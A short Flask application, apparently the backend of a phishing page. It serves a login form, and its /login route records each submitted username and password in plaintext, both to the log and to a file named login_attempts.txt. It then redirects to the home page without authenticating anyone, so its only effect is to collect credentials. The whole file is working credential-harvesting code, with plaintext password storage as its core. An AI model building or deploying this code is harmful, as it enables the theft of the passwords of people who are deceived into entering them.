from flask import Flask, render_template, request, redirect
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)


@app.route('/')
def home():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    logger.info(f"Попытка входа: Пользователь={username}, Пароль={password}")

    with open('login_attempts.txt', 'a', encoding='utf-8') as f:
        f.write(f"Пользователь: {username}, Пароль: {password}\n")

    return redirect('/')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)